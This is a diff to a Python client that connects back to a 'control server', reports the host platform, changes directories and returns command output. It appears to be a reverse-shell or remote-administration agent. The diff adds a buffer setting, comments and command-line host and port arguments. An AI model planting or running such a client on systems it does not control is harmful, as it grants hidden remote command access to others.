@@ -7,9 +7,10 @@ from time import sleep
 
 
 class Client(object):
-    def __init__(self, host='', port=6667):
+    def __init__(self, host='', port=6667, recv_size=1024):
         self.host = host
         self.port = port
+        self.recv_size = recv_size
         self.connected = False
         self.sock = self._connect_to_server()
 
@@ -53,8 +54,9 @@ class Client(object):
         # If we have a socket, then proceed to receive commands.
         if self.sock:
             while True:
+                # Try to receive data.
                 try:
-                    data = self.sock.recv(1024)
+                    data = self.sock.recv(self.recv_size)
                 except socket.error as error_message:
                     print('Server closed connection:', error_message)
                     self.sock.close()
@@ -65,8 +67,12 @@ class Client(object):
                 if len(data) < 1:
                     continue
 
+                # Check for single_command commands.  This block handles server/client exchanges
+                # when the initial connection is made, or the server needs to get the current
+                # wroking directory.
                 if data.decode('utf-8')[:15] == 'single_command-':
                     d = data.decode('utf-8')[15:]
+                    # Get the OS name.
                     if d == 'get_platform':
                         self.sock.send(str.encode(sys.platform + '~!_TERM_%~'))
                         continue
@@ -74,6 +80,7 @@ class Client(object):
                         self._send_output_with_cwd('')
                         continue
 
+                # Handle quit events sent from the server.
                 if data.decode('utf-8') == 'quit':
                     # The control server is shutting down, so we should shutdown
                     # then start trying to reconnect for the next session.
@@ -90,7 +97,7 @@ class Client(object):
 
                         # Cross platform cd to ~/
                         if _dir[:2] == '~/':
-                            # shorten variable name and function name for the next 1 liner.
+                            # Shorten variable name and function name for the next 1 liner.
                             p, expusr = sys.platform, expanduser
                             # Get the full path.
                             _dir = expusr('~') + '/' + _dir[2:] if p != 'win32' else expanduser('~') + '\\' + _dir[2:]
@@ -103,6 +110,7 @@ class Client(object):
                         self._send_output_with_cwd('')
                         continue
                     except Exception as err_msg:
+                        # If we get any errors, send em back!
                         err_msg = str(err_msg)
                         self._send_output_with_cwd(err_msg + "\n")
                         continue
@@ -125,5 +133,29 @@ class Client(object):
 
 
 if __name__ == '__main__':
-    c = Client(host='10.0.0.213', port=6667)
-    c.main()
+    the_host = ''
+    the_port = 6667
+    the_recv_size = 1024
+
+    def check_cli_arg(arg):
+        global the_host
+        global the_port
+        global the_recv_size
+
+        if 'host=' in arg:
+            the_host = arg.split('=')[1]
+        elif 'port=' in arg:
+            the_port = int(arg.split('=')[1])
+        elif 'recv_size=' in arg:
+            the_recv_size = int(arg.split('=')[1])
+
+    for argument in sys.argv[1:]:
+        check_cli_arg(argument)
+
+    # Instantiate the client.
+    client = Client(
+        host=the_host,
+        port=the_port,
+        recv_size=the_recv_size
+    )
+    client.main()
